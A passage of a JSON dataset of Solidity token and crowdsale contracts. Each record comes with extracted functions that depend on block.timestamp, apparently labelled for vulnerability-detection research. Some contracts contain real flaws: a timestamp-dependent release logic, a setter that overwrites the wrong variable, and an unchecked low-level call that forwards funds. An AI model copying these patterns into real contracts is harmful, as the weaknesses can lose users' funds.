totalBalance.mul(block.timestamp.sub(start)).div(duration);\n }\n }\n}\ncontract NokuCustomERC20 is NokuCustomToken, DetailedERC20, MintableToken, BurnableToken {\n using SafeMath for uint256;\n event LogNokuCustomERC20Created(\n address indexed caller,\n string indexed name,\n string indexed symbol,\n uint8 decimals,\n uint256 transferableFromBlock,\n uint256 lockEndBlock,\n address pricingPlan,\n address serviceProvider\n );\n event LogMintingFeeEnabledChanged(address indexed caller, bool indexed mintingFeeEnabled);\n event LogInformationChanged(address indexed caller, string name, string symbol);\n event LogTransferFeePaymentFinished(address indexed caller);\n event LogTransferFeePercentageChanged(address indexed caller, uint256 indexed transferFeePercentage);\n bool public mintingFeeEnabled;\n uint256 public transferableFromBlock;\n uint256 public lockEndBlock;\n mapping (address => uint256) public initiallyLockedBalanceOf;\n uint256 public transferFeePercentage;\n bool public transferFeePaymentFinished;\n TokenTimelock public timelock;\n TokenVesting public vesting;\n bytes32 public constant BURN_SERVICE_NAME = \"NokuCustomERC20.burn\";\n bytes32 public constant MINT_SERVICE_NAME = \"NokuCustomERC20.mint\";\n bytes32 public constant TIMELOCK_SERVICE_NAME = \"NokuCustomERC20.timelock\";\n bytes32 public constant VESTING_SERVICE_NAME = \"NokuCustomERC20.vesting\";\n modifier canTransfer(address _from, uint _value) {\n require(block.number >= transferableFromBlock, \"token not transferable\");\n if (block.number < lockEndBlock) {\n uint256 locked = lockedBalanceOf(_from);\n if (locked > 0) {\n uint256 newBalance = balanceOf(_from).sub(_value);\n require(newBalance >= locked, \"_value exceeds locked amount\");\n }\n }\n _;\n }\n constructor(\n string _name,\n string _symbol,\n uint8 _decimals,\n uint256 _transferableFromBlock,\n uint256 _lockEndBlock,\n address _pricingPlan,\n address _serviceProvider\n )\n NokuCustomToken(_pricingPlan, _serviceProvider)\n DetailedERC20(_name, _symbol, _decimals) public\n {\n require(bytes(_name).length > 0, \"_name is empty\");\n require(bytes(_symbol).length > 0, \"_symbol is empty\");\n require(_lockEndBlock >= _transferableFromBlock, \"_lockEndBlock lower than _transferableFromBlock\");\n transferableFromBlock = _transferableFromBlock;\n lockEndBlock = _lockEndBlock;\n mintingFeeEnabled = true;\n emit LogNokuCustomERC20Created(\n msg.sender,\n _name,\n _symbol,\n _decimals,\n _transferableFromBlock,\n _lockEndBlock,\n _pricingPlan,\n _serviceProvider\n );\n }\n function setMintingFeeEnabled(bool _mintingFeeEnabled) public onlyOwner returns(bool successful) {\n require(_mintingFeeEnabled != mintingFeeEnabled, \"_mintingFeeEnabled == mintingFeeEnabled\");\n mintingFeeEnabled = _mintingFeeEnabled;\n emit LogMintingFeeEnabledChanged(msg.sender, _mintingFeeEnabled);\n return true;\n }\n function setInformation(string _name, string _symbol) public onlyOwner returns(bool successful) {\n require(bytes(_name).length > 0, \"_name is empty\");\n require(bytes(_symbol).length > 0, \"_symbol is empty\");\n name = _name;\n symbol = _symbol;\n emit LogInformationChanged(msg.sender, _name, _symbol);\n return true;\n }\n function finishTransferFeePayment() public onlyOwner returns(bool finished) {\n require(!transferFeePaymentFinished, \"transfer fee finished\");\n transferFeePaymentFinished = true;\n emit LogTransferFeePaymentFinished(msg.sender);\n return true;\n }\n function setTransferFeePercentage(uint256 _transferFeePercentage) public onlyOwner {\n require(0 <= _transferFeePercentage && _transferFeePercentage <= 100, \"_transferFeePercentage not in [0, 100]\");\n require(_transferFeePercentage != transferFeePercentage, \"_transferFeePercentage equal to current value\");\n transferFeePercentage = _transferFeePercentage;\n emit LogTransferFeePercentageChanged(msg.sender, _transferFeePercentage);\n }\n function lockedBalanceOf(address _to) public view returns(uint256 locked) {\n uint256 initiallyLocked = initiallyLockedBalanceOf[_to];\n if (block.number >= lockEndBlock) return 0;\n else if (block.number <= transferableFromBlock) return initiallyLocked;\n uint256 releaseForBlock = initiallyLocked.div(lockEndBlock.sub(transferableFromBlock));\n uint256 released = block.number.sub(transferableFromBlock).mul(releaseForBlock);\n return initiallyLocked.sub(released);\n }\n function transferFee(uint256 _value) public view returns(uint256 usageFee) {\n return _value.mul(transferFeePercentage).div(100);\n }\n function freeTransfer() public view returns (bool isTransferFree) {\n return transferFeePaymentFinished || transferFeePercentage == 0;\n }\n function transfer(address _to, uint256 _value) canTransfer(msg.sender, _value) public returns(bool transferred) {\n if (freeTransfer()) {\n return super.transfer(_to, _value);\n }\n else {\n uint256 usageFee = transferFee(_value);\n uint256 netValue = _value.sub(usageFee);\n bool feeTransferred = super.transfer(owner, usageFee);\n bool netValueTransferred = super.transfer(_to, netValue);\n return feeTransferred && netValueTransferred;\n }\n }\n function transferFrom(address _from, address _to, uint256 _value) canTransfer(_from, _value) public returns(bool transferred) {\n if (freeTransfer()) {\n return super.transferFrom(_from, _to, _value);\n }\n else {\n uint256 usageFee = transferFee(_value);\n uint256 netValue = _value.sub(usageFee);\n bool feeTransferred = super.transferFrom(_from, owner, usageFee);\n bool netValueTransferred = super.transferFrom(_from, _to, netValue);\n return feeTransferred && netValueTransferred;\n }\n }\n function burn(uint256 _amount) public canBurn {\n require(_amount > 0, \"_amount is zero\");\n super.burn(_amount);\n require(pricingPlan.payFee(BURN_SERVICE_NAME, _amount, msg.sender), \"burn fee failed\");\n }\n function mint(address _to, uint256 _amount) public onlyOwner canMint returns(bool minted) {\n require(_to != 0, \"_to is zero\");\n require(_amount > 0, \"_amount is zero\");\n super.mint(_to, _amount);\n if (mintingFeeEnabled) {\n require(pricingPlan.payFee(MINT_SERVICE_NAME, _amount, msg.sender), \"mint fee failed\");\n }\n return true;\n }\n function mintLocked(address _to, uint256 _amount) public onlyOwner canMint returns(bool minted) {\n initiallyLockedBalanceOf[_to] = initiallyLockedBalanceOf[_to].add(_amount);\n return mint(_to, _amount);\n }\n function mintTimelocked(address _to, uint256 _amount, uint256 _releaseTime) public onlyOwner canMint\n returns(bool minted)\n {\n require(timelock == address(0), \"TokenTimelock already activated\");\n timelock = new TokenTimelock(this, _to, _releaseTime);\n minted = mint(timelock, _amount);\n require(pricingPlan.payFee(TIMELOCK_SERVICE_NAME, _amount, msg.sender), \"timelock fee failed\");\n }\n function mintVested(address _to, uint256 _amount, uint256 _startTime, uint256 _duration) public onlyOwner canMint\n returns(bool minted)\n {\n require(vesting == address(0), \"TokenVesting already activated\");\n vesting = new TokenVesting(_to, _startTime, 0, _duration, true);\n minted = mint(vesting, _amount);\n require(pricingPlan.payFee(VESTING_SERVICE_NAME, _amount, msg.sender), \"vesting fee failed\");\n }\n function releaseVested() public returns(bool released) {\n require(vesting != address(0), \"TokenVesting not activated\");\n vesting.release(this);\n return true;\n }\n function revokeVested() public onlyOwner returns(bool revoked) {\n require(vesting != address(0), \"TokenVesting not activated\");\n vesting.revoke(this);\n return true;\n }\n}\nlibrary AddressUtils {\n function isContract(address addr) internal view returns (bool) {\n uint256 size;\n assembly { size := extcodesize(addr) }\n return size > 0;\n }\n}\ncontract NokuCustomService is Pausable {\n using AddressUtils for address;\n event LogPricingPlanChanged(address indexed caller, address indexed pricingPlan);\n NokuPricingPlan public pricingPlan;\n constructor(address _pricingPlan) internal {\n require(_pricingPlan.isContract(), \"_pricingPlan is not contract\");\n pricingPlan = NokuPricingPlan(_pricingPlan);\n }\n function setPricingPlan(address _pricingPlan) public onlyOwner {\n require(_pricingPlan.isContract(), \"_pricingPlan is not contract\");\n require(NokuPricingPlan(_pricingPlan) != pricingPlan, \"_pricingPlan equal to current\");\n pricingPlan = NokuPricingPlan(_pricingPlan);\n emit LogPricingPlanChanged(msg.sender, _pricingPlan);\n }\n}\ncontract NokuCustomERC20Service is NokuCustomService {\n event LogNokuCustomERC20ServiceCreated(address caller, address indexed pricingPlan);\n uint256 public constant CREATE_AMOUNT = 1 * 10**18;\n uint8 public constant DECIMALS = 18;\n bytes32 public constant CUSTOM_ERC20_CREATE_SERVICE_NAME = \"NokuCustomERC20.create\";\n constructor(address _pricingPlan) NokuCustomService(_pricingPlan) public {\n emit LogNokuCustomERC20ServiceCreated(msg.sender, _pricingPlan);\n }\n function createCustomToken(string _name, string _symbol, uint8 ) public returns(NokuCustomERC20 customToken) {\n customToken = new NokuCustomERC20(\n _name,\n _symbol,\n DECIMALS,\n block.number,\n block.number,\n pricingPlan,\n owner\n );\n customToken.transferOwnership(msg.sender);\n require(pricingPlan.payFee(CUSTOM_ERC20_CREATE_SERVICE_NAME, CREATE_AMOUNT, msg.sender), \"fee payment failed\");\n }\n function createCustomToken(\n string _name,\n string _symbol,\n uint8 ,\n uint256 transferableFromBlock,\n uint256 lockEndBlock\n )\n public returns(NokuCustomERC20 customToken)\n {\n customToken = new NokuCustomERC20(\n _name,\n _symbol,\n DECIMALS,\n transferableFromBlock,\n lockEndBlock,\n pricingPlan,\n owner\n );\n customToken.transferOwnership(msg.sender);\n require(pricingPlan.payFee(CUSTOM_ERC20_CREATE_SERVICE_NAME, CREATE_AMOUNT, msg.sender), \"fee payment failed\");\n }\n}",
  "extract_feature": [
    "function release() public {\nrequire(block.timestamp >= releaseTime);\nuint256 amount = token.balanceOf(this);\nrequire(amount > 0);\ntoken.safeTransfer(beneficiary, amount);\n}",
    "function vestedAmount(ERC20Basic token) public view returns (uint256) {\nuint256 currentBalance = token.balanceOf(this);\nuint256 totalBalance = currentBalance.add(released[token]);\nif (block.timestamp < cliff) {\nreturn 0;\n} else if (block.timestamp >= start.add(duration) || revoked[token]) {\nreturn totalBalance;\n} else {\nreturn totalBalance.mul(block.timestamp.sub(start)).div(duration);\n}\n}",
    "function lockedBalanceOf(address _to) public view returns(uint256 locked) {\nuint256 initiallyLocked = initiallyLockedBalanceOf[_to];\nif (block.number >= lockEndBlock) return 0;\nelse if (block.number <= transferableFromBlock) return initiallyLocked;\nuint256 releaseForBlock = initiallyLocked.div(lockEndBlock.sub(transferableFromBlock));\nuint256 released = block.number.sub(transferableFromBlock).mul(releaseForBlock);\nreturn initiallyLocked.sub(released);\n}",
    "function createCustomToken(string _name, string _symbol, uint8 ) public returns(NokuCustomERC20 customToken) {\ncustomToken = new NokuCustomERC20(\n_name,\n_symbol,\nDECIMALS,\nblock.number,\nblock.number,\npricingPlan,\nowner\n);\ncustomToken.transferOwnership(msg.sender);\nrequire(pricingPlan.payFee(CUSTOM_ERC20_CREATE_SERVICE_NAME, CREATE_AMOUNT, msg.sender), \"fee payment failed\");\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa9fa0e1460cdfa1efc"
  },
  "filename": "3271.sol",
  "content": "pragma solidity ^0.4.24;\ncontract hodlEthereum {\n event Hodl(address indexed hodler, uint indexed amount);\n event Party(address indexed hodler, uint indexed amount);\n mapping (address => uint) public hodlers;\n uint constant partyTime = 1535760000;\n function hodl() payable public {\n hodlers[msg.sender] += msg.value;\n emit Hodl(msg.sender, msg.value);\n }\n function party() public {\n require (block.timestamp > partyTime && hodlers[msg.sender] > 0);\n uint value = hodlers[msg.sender];\n hodlers[msg.sender] = 0;\n msg.sender.transfer(value);\n emit Party(msg.sender, value);\n }\n}",
  "extract_feature": [
    "function party() public {\nrequire (block.timestamp > partyTime && hodlers[msg.sender] > 0);\nuint value = hodlers[msg.sender];\nhodlers[msg.sender] = 0;\nmsg.sender.transfer(value);\nemit Party(msg.sender, value);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa9fa0e1460cdfa1efd"
  },
  "filename": "347.sol",
  "content": "pragma solidity ^0.4.24;\nlibrary SafeMath {\n function mul(uint256 _a, uint256 _b) internal pure returns (uint256) {\n if (_a == 0) {\n return 0;\n }\n uint256 c = _a * _b;\n require(c / _a == _b);\n return c;\n }\n function div(uint256 _a, uint256 _b) internal pure returns (uint256) {\n require(_b > 0);\n uint256 c = _a / _b;\n return c;\n }\n function sub(uint256 _a, uint256 _b) internal pure returns (uint256) {\n require(_b <= _a);\n uint256 c = _a - _b;\n return c;\n }\n function add(uint256 _a, uint256 _b) internal pure returns (uint256) {\n uint256 c = _a + _b;\n require(c >= _a);\n return c;\n }\n function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n require(b != 0);\n return a % b;\n }\n}\nlibrary SafeERC20 {\n function safeTransfer(\n ERC20 _token,\n address _to,\n uint256 _value\n )\n internal\n {\n require(_token.transfer(_to, _value));\n }\n function safeTransferFrom(\n ERC20 _token,\n address _from,\n address _to,\n uint256 _value\n )\n internal\n {\n require(_token.transferFrom(_from, _to, _value));\n }\n function safeApprove(\n ERC20 _token,\n address _spender,\n uint256 _value\n )\n internal\n {\n require(_token.approve(_spender, _value));\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipRenounced(address indexed previousOwner);\n event OwnershipTransferred(\n address indexed previousOwner,\n address indexed newOwner\n );\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function renounceOwnership() public onlyOwner {\n emit OwnershipRenounced(owner);\n owner = address(0);\n }\n function transferOwnership(address _newOwner) public onlyOwner {\n _transferOwnership(_newOwner);\n }\n function _transferOwnership(address _newOwner) internal {\n require(_newOwner != address(0));\n emit OwnershipTransferred(owner, _newOwner);\n owner = _newOwner;\n}\n}\ncontract ERC20 {\n function totalSupply() public view returns (uint256);\n function balanceOf(address _who) public view returns (uint256);\n function allowance(address _owner, address _spender)\n public view returns (uint256);\n function transfer(address _to, uint256 _value) public returns (bool);\n function approve(address _spender, uint256 _value)\n public returns (bool);\n function transferFrom(address _from, address _to, uint256 _value)\n public returns (bool);\n event Transfer(\n address indexed from,\n address indexed to,\n uint256 value\n );\n event Approval(\n address indexed owner,\n address indexed spender,\n uint256 value\n );\n}\ncontract AddressesFilterFeature is Ownable {}\ncontract ERC20Basic {}\ncontract BasicToken is ERC20Basic {}\ncontract StandardToken is ERC20, BasicToken {}\ncontract MintableToken is AddressesFilterFeature, StandardToken {}\ncontract Token is MintableToken {\n function mint(address, uint256) public returns (bool);\n}\ncontract CrowdsaleWPTByRounds is Ownable {\n using SafeMath for uint256;\n using SafeERC20 for ERC20;\n ERC20 public token;\n address public wallet;\n Token public minterContract;\n uint256 public rate;\n uint256 public tokensRaised;\n uint256 public cap;\n uint256 public openingTime;\n uint256 public closingTime;\n uint public minInvestmentValue;\n bool public checksOn;\n uint256 public gasAmount;\n function setMinter(address _minterAddr) public onlyOwner {\n minterContract = Token(_minterAddr);\n }\n modifier onlyWhileOpen {\n require(block.timestamp >= openingTime && block.timestamp <= closingTime);\n _;\n }\n event TokenPurchase(\n address indexed purchaser,\n address indexed beneficiary,\n uint256 value,\n uint256 amount\n );\n event TokensTransfer(\n address indexed _from,\n address indexed _to,\n uint256 amount,\n bool isDone\n );\nconstructor () public {\n rate = 400;\n wallet = 0xeA9cbceD36a092C596e9c18313536D0EEFacff46;\n cap = 400000000000000000000000;\n openingTime = 1534558186;\n closingTime = 1535320800;\n minInvestmentValue = 0.02 ether;\n checksOn = true;\n gasAmount = 25000;\n }\n function capReached() public view returns (bool) {\n return tokensRaised >= cap;\n }\n function changeRate(uint256 newRate) public onlyOwner {\n rate = newRate;\n }\n function closeRound() public onlyOwner {\n closingTime = block.timestamp + 1;\n }\n function setToken(ERC20 _token) public onlyOwner {\n token = _token;\n }\n function setWallet(address _wallet) public onlyOwner {\n wallet = _wallet;\n }\n function changeMinInvest(uint256 newMinValue) public onlyOwner {\n rate = newMinValue;\n }\n function setChecksOn(bool _checksOn) public onlyOwner {\n checksOn = _checksOn;\n }\n function setGasAmount(uint256 _gasAmount) public onlyOwner {\n gasAmount = _gasAmount;\n }\n function setCap(uint256 _newCap) public onlyOwner {\n cap = _newCap;\n }\n function startNewRound(uint256 _rate, address _wallet, ERC20 _token, uint256 _cap, uint256 _openingTime, uint256 _closingTime) payable public onlyOwner {\n require(!hasOpened());\n rate = _rate;\n wallet = _wallet;\n token = _token;\n cap = _cap;\n openingTime = _openingTime;\n closingTime = _closingTime;\n }\n function hasClosed() public view returns (bool) {\n return block.timestamp > closingTime;\n }\n function hasOpened() public view returns (bool) {\n return (openingTime < block.timestamp && block.timestamp < closingTime);\n }\n function () payable external {\n buyTokens(msg.sender);\n }\n function buyTokens(address _beneficiary) payable public{\n uint256 weiAmount = msg.value;\n if (checksOn) {\n _preValidatePurchase(_beneficiary, weiAmount);\n }\n uint256 tokens = _getTokenAmount(weiAmount);\n tokensRaised = tokensRaised.add(tokens);\n minterContract.mint(_beneficiary, tokens);\n emit TokenPurchase(\n msg.sender,\n _beneficiary,\n weiAmount,\n tokens\n );\n _forwardFunds();\n }\n function _preValidatePurchase(address _beneficiary, uint256 _weiAmount)\n internal\n view\n onlyWhileOpen\n {\n require(_beneficiary != address(0));\n require(_weiAmount != 0 && _weiAmount > minInvestmentValue);\n require(tokensRaised.add(_getTokenAmount(_weiAmount)) <= cap);\n }\n function _deliverTokens(address _beneficiary, uint256 _tokenAmount) internal {\n token.safeTransfer(_beneficiary, _tokenAmount);\n }\n function _processPurchase(address _beneficiary, uint256 _tokenAmount) internal {\n _deliverTokens(_beneficiary, _tokenAmount);\n }\n function _getTokenAmount(uint256 _weiAmount) internal view returns (uint256) {\n return _weiAmount.mul(rate);\n }\n function _forwardFunds() internal {\n bool isTransferDone = wallet.call.value(msg.value).gas(gasAmount)();\n emit TokensTransfer (\n msg.sender,\n wallet,\n msg.value,\n isTransferDone\n );\n }\n}",
  "extract_feature": [
    "function closeRound() public onlyOwner {\nclosingTime = block.timestamp + 1;\n}",
    "function hasClosed() public view returns (bool) {\nreturn block.timestamp > closingTime;\n}",
    "function hasOpened() public view returns (bool) {\nreturn (openingTime < block.timestamp && block.timestamp < closingTime);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa9fa0e1460cdfa1efe"
  },
  "filename": "361.sol",
  "content": "pragma solidity ^0.4.24;\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n uint256 totalSupply_;\n function totalSupply() public view returns (uint256) {\n return totalSupply_;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public view returns (uint256) {\n return balances[_owner];\n }\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender)\n public view returns (uint256);\n function transferFrom(address from, address to, uint256 value)\n public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(\n address indexed owner,\n address indexed spender,\n uint256 value\n );\n}\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) internal allowed;\n function transferFrom(\n address _from,\n address _to,\n uint256 _value\n )\n public\n returns (bool)\n {\n require(_to != address(0));\n require(_value <= balances[_from]);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n emit Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(\n address _owner,\n address _spender\n )\n public\n view\n returns (uint256)\n {\n return allowed[_owner][_spender];\n }\n function increaseApproval(\n address _spender,\n uint _addedValue\n )\n public\n returns (bool)\n {\n allowed[msg.sender][_spender] = (\n allowed[msg.sender][_spender].add(_addedValue));\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval(\n address _spender,\n uint _subtractedValue\n )\n public\n returns (bool)\n {\n uint oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipRenounced(address indexed previousOwner);\n event OwnershipTransferred(\n address indexed previousOwner,\n address indexed newOwner\n );\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function renounceOwnership() public onlyOwner {\n emit OwnershipRenounced(owner);\n owner = address(0);\n }\n function transferOwnership(address _newOwner) public onlyOwner {\n _transferOwnership(_newOwner);\n }\n function _transferOwnership(address _newOwner) internal {\n require(_newOwner != address(0));\n emit OwnershipTransferred(owner, _newOwner);\n owner = _newOwner;\n }\n}\ncontract MintableToken is StandardToken, Ownable {\n event Mint(address indexed to, uint256 amount);\n event MintFinished();\n bool public mintingFinished = false;\n modifier canMint() {\n require(!mintingFinished);\n _;\n }\n modifier hasMintPermission() {\n require(msg.sender == owner);\n _;\n }\n function mint(\n address _to,\n uint256 _amount\n )\n hasMintPermission\n canMint\n public\n returns (bool)\n {\n totalSupply_ = totalSupply_.add(_amount);\n balances[_to] = balances[_to].add(_amount);\n emit Mint(_to, _amount);\n emit Transfer(address(0), _to, _amount);\n return true;\n }\n function finishMinting() onlyOwner canMint public returns (bool) {\n mintingFinished = true;\n emit MintFinished();\n return true;\n }\n}\ncontract FreezableToken is StandardToken {\n mapping (bytes32 => uint64) internal chains;\n mapping (bytes32 => uint) internal freezings;\n mapping (address => uint) internal freezingBalance;\n event Freezed(address indexed to, uint64 release, uint amount);\n event Released(address indexed owner, uint amount);\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return super.balanceOf(_owner) + freezingBalance[_owner];\n }\n function actualBalanceOf(address _owner) public view returns (uint256 balance) {\n return super.balanceOf(_owner);\n }\n function freezingBalanceOf(address _owner) public view returns (uint256 balance) {\n return freezingBalance[_owner];\n }\n function freezingCount(address _addr) public view returns (uint count) {\n uint64 release = chains[toKey(_addr, 0)];\n while (release != 0) {\n count++;\n release = chains[toKey(_addr, release)];\n }\n }\n function getFreezing(address _addr, uint _index) public view returns (uint64 _release, uint _balance) {\n for (uint i = 0; i < _index + 1; i++) {\n _release = chains[toKey(_addr, _release)];\n if (_release == 0) {\n return;\n }\n }\n _balance = freezings[toKey(_addr, _release)];\n }\n function freezeTo(address _to, uint _amount, uint64 _until) public {\n require(_to != address(0));\n require(_amount <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_amount);\n bytes32 currentKey = toKey(_to, _until);\n freezings[currentKey] = freezings[currentKey].add(_amount);\n freezingBalance[_to] = freezingBalance[_to].add(_amount);\n freeze(_to, _until);\n emit Transfer(msg.sender, _to, _amount);\n emit Freezed(_to, _until, _amount);\n }\n function releaseOnce() public {\n bytes32 headKey = toKey(msg.sender, 0);\n uint64 head = chains[headKey];\n require(head != 0);\n require(uint64(block.timestamp) > head);\n bytes32 currentKey = toKey(msg.sender, head);\n uint64 next = chains[currentKey];\n uint amount = freezings[currentKey];\n delete freezings[currentKey];\n balances[msg.sender] = balances[msg.sender].add(amount);\n freezingBalance[msg.sender] = freezingBalance[msg.sender].sub(amount);\n if (next == 0) {\n delete chains[headKey];\n } else {\n chains[headKey] = next;\n delete chains[currentKey];\n }\n emit Released(msg.sender, amount);\n }\n function releaseAll() public returns (uint tokens) {\n uint release;\n uint balance;\n (release, balance) = getFreezing(msg.sender, 0);\n while (release != 0 && block.timestamp > release) {\n releaseOnce();\n tokens += balance;\n (release, balance) = getFreezing(msg.sender, 0);\n }\n }\n function toKey(address _addr, uint _release) internal pure returns (bytes32 result) {\n result = 0x5749534800000000000000000000000000000000000000000000000000000000;\n assembly {\n result := or(result, mul(_addr, 0x10000000000000000))\n result := or(result, _release)\n }\n }\n function freeze(address _to, uint64 _until) internal {\n require(_until > block.timestamp);\n bytes32 key = toKey(_to, _until);\n bytes32 parentKey = toKey(_to, uint64(0));\n uint64 next = chains[parentKey];\n if (next == 0) {\n chains[parentKey] = _until;\n return;\n }\n bytes32 nextKey = toKey(_to, next);\n uint parent;\n while (next != 0 && _until > next) {\n parent = next;\n parentKey = nextKey;\n next = chains[nextKey];\n nextKey = toKey(_to, next);\n }\n if (_until == next) {\n return;\n }\n if (next != 0) {\n chains[key] = next;\n }\n chains[parentKey] = _until;\n }\n}\ncontract BurnableToken is BasicToken {\n event Burn(address indexed burner, uint256 value);\n function burn(uint256 _value) public {\n _burn(msg.sender, _value);\n }\n function _burn(address _who, uint256 _value) internal {\n require(_value <= balances[_who]);\n balances[_who] = balances[_who].sub(_value);\n totalSupply_ = totalSupply_.sub(_value);\n emit Burn(_who, _value);\n emit Transfer(_who, address(0), _value);\n }\n}\ncontract Pausable is Ownable {\n event Pause();\n event Unpause();\n bool public paused = false;\n modifier whenNotPaused() {\n require(!paused);\n _;\n }\n modifier whenPaused() {\n require(paused);\n _;\n }\n function pause() onlyOwner whenNotPaused public {\n paused = true;\n emit Pause();\n }\n function unpause() onlyOwner whenPaused public {\n paused = false;\n emit Unpause();\n }\n}\ncontract FreezableMintableToken is FreezableToken, MintableToken {\n function mintAndFreeze(address _to, uint _amount, uint64 _until) public onlyOwner canMint returns (bool) {\n totalSupply_ = totalSupply_.add(_amount);\n bytes32 currentKey = toKey(_to, _until);\n freezings[currentKey] = freezings[currentKey].add(_amount);\n freezingBalance[_to] = freezingBalance[_to].add(_amount);\n freeze(_to, _until);\n emit Mint(_to, _amount);\n emit Freezed(_to, _until, _amount);\n emit Transfer(msg.sender, _to, _amount);\n return true;\n }\n}\ncontract Consts {\n uint public constant TOKEN_DECIMALS = 0;\n uint8 public constant TOKEN_DECIMALS_UINT8 = 0;\n uint public constant TOKEN_DECIMAL_MULTIPLIER = 10 ** TOKEN_DECIMALS;\n string public constant TOKEN_NAME = \"MissYou\";\n string public constant TOKEN_SYMBOL = \"MIS\";\n bool public constant PAUSED = false;\n address public constant TARGET_USER = 0x210d60d0ec127f0fff477a1b1b9424bb1c32876d;\n bool public constant CONTINUE_MINTING = false;\n}\ncontract MainToken is Consts, FreezableMintableToken, BurnableToken, Pausable\n{\n event Initialized();\n bool public initialized = false;\n constructor() public {\n init();\n transferOwnership(TARGET_USER);\n }\n function name() public pure returns (string _name) {\n return TOKEN_NAME;\n }\n function symbol() public pure returns (string _symbol) {\n return TOKEN_SYMBOL;\n }\n function decimals() public pure returns (uint8 _decimals) {\n return TOKEN_DECIMALS_UINT8;\n }\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool _success) {\n require(!paused);\n return super.transferFrom(_from, _to, _value);\n }\n function transfer(address _to, uint256 _value) public returns (bool _success) {\n require(!paused);\n return super.transfer(_to, _value);\n }\n function init() private {\n require(!initialized);\n initialized = true;\n if (PAUSED) {\n pause();\n }\n address[1] memory addresses = [address(0x210d60d0ec127f0fff477a1b1b9424bb1c32876d)];\n uint[1] memory amounts = [uint(690000000000)];\n uint64[1] memory freezes = [uint64(0)];\n for (uint i = 0; i < addresses.length; i++) {\n if (freezes[i] == 0) {\n mint(addresses[i], amounts[i]);\n } else {\n mintAndFreeze(addresses[i], amounts[i], freezes[i]);\n }\n }\n if (!CONTINUE_MINTING) {\n finishMinting();\n }\n emit Initialized();\n }\n}",
  "extract_feature": [
    "function releaseOnce() public {\nbytes32 headKey = toKey(msg.sender, 0);\nuint64 head = chains[headKey];\nrequire(head != 0);\nrequire(uint64(block.timestamp) > head);\nbytes32 currentKey = toKey(msg.sender, head);\nuint64 next = chains[currentKey];\nuint amount = freezings[currentKey];\ndelete freezings[currentKey];\nbalances[msg.sender] = balances[msg.sender].add(amount);\nfreezingBalance[msg.sender] = freezingBalance[msg.sender].sub(amount);\nif (next == 0) {\ndelete chains[headKey];\n} else {\nchains[headKey] = next;\ndelete chains[currentKey];\n}\nemit Released(msg.sender, amount);\n}",
    "function releaseAll() public returns (uint tokens) {\nuint release;\nuint balance;\n(release, balance) = getFreezing(msg.sender, 0);\nwhile (release != 0 && block.timestamp > release) {\nreleaseOnce();\ntokens += balance;\n(release, balance) = getFreezing(msg.sender, 0);\n}\n}",
    "function freeze(address _to, uint64 _until) internal {\nrequire(_until > block.timestamp);\nbytes32 key = toKey(_to, _until);\nbytes32 parentKey = toKey(_to, uint64(0));\nuint64 next = chains[parentKey];\nif (next == 0) {\nchains[parentKey] = _until;\nreturn;\n}\nbytes32 nextKey = toKey(_to, next);\nuint parent;\nwhile (next != 0 && _until > next) {\nparent = next;\nparentKey = nextKey;\nnext = chains[nextKey];\nnextKey = toKey(_to, next);\n}\nif (_until == next) {\nreturn;\n}\nif (next != 0) {\nchains[key] = next;\n}\nchains[parentKey] = _until;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa9fa0e1460cdfa1eff"
  },
  "filename": "399.sol",
